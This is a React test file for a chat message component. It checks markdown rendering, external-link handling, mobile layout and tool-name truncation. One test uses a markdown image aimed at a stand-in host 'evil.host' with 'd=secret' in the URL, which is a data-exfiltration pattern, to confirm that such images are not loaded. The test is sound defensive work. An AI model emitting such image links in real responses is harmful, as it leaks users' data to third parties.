import { render, screen } from '@testing-library/react';
import { MemoryRouter } from 'react-router-dom';
import { describe, it, expect } from 'vitest';

import { ChatMessage } from '../ChatMessage';

function renderAssistant(content: string) {
  return render(
    <MemoryRouter>
      <ChatMessage
        message={{
          id: 'm1',
          conversation_id: 'c1',
          role: 'assistant',
          content,
          tool_calls: [],
          created_at: '2026-10-05T00:00:00Z',
        }}
      />
    </MemoryRouter>,
  );
}

describe('ChatMessage markdown', () => {
  it('renders a markdown image as a link instead of loading it', () => {
    const { container } = renderAssistant('![leak](https://evil.host/p.png?d=secret)');

    expect(container.querySelector('img')).toBeNull();
    const link = screen.getByRole('link', { name: 'leak' });
    expect(link).toHaveAttribute('href', 'https://evil.host/p.png?d=secret');
    expect(link).toHaveAttribute('target', '_blank');
  });

  it('opens a protocol-relative //host link as an external link', () => {
    renderAssistant('[docs](//evil.host/x)');

    const link = screen.getByRole('link', { name: 'docs' });
    expect(link).toHaveAttribute('target', '_blank');
    expect(link).toHaveAttribute('rel', 'noreferrer noopener');
  });

  it('keeps a single-slash path as an in-app link', () => {
    renderAssistant('[project](/projects/p1)');

    const link = screen.getByRole('link', { name: 'project' });
    expect(link).toHaveAttribute('href', '/projects/p1');
    expect(link).not.toHaveAttribute('target');
  });
});

describe('ChatMessage on a phone', () => {
  it('scrolls a wide markdown table in its own wrapper and wraps a long command inside the message', () => {
    renderAssistant('| Project | Fix |\n|---|---|\n| checkout-service | 2.17.1 |\n\nRun `mvn versions:use-dep-version -Dincludes=org.apache.logging.log4j:log4j-core`');

    expect(screen.getByRole('table').parentElement).toHaveClass('overflow-x-auto');
    const body = screen.getByRole('table').closest('.prose');
    expect(body).toHaveClass('break-words');
    expect(body?.parentElement).toHaveClass('min-w-0');
  });

  it("truncates a long tool name in its call's header and names it in full as the title", () => {
    render(
      <MemoryRouter>
        <ChatMessage
          message={{
            id: 'm2',
            conversation_id: 'c1',
            role: 'assistant',
            content: 'Done.',
            tool_calls: [{ tool_name: 'get_findings_by_cve_and_project_branch', arguments: {}, result: {} }],
            created_at: '2026-10-05T00:00:00Z',
          }}
        />
      </MemoryRouter>,
    );

    const name = screen.getByText('get_findings_by_cve_and_project_branch');
    expect(name).toHaveClass('min-w-0', 'truncate');
    expect(name).toHaveAttribute('title', 'get_findings_by_cve_and_project_branch');
  });
});
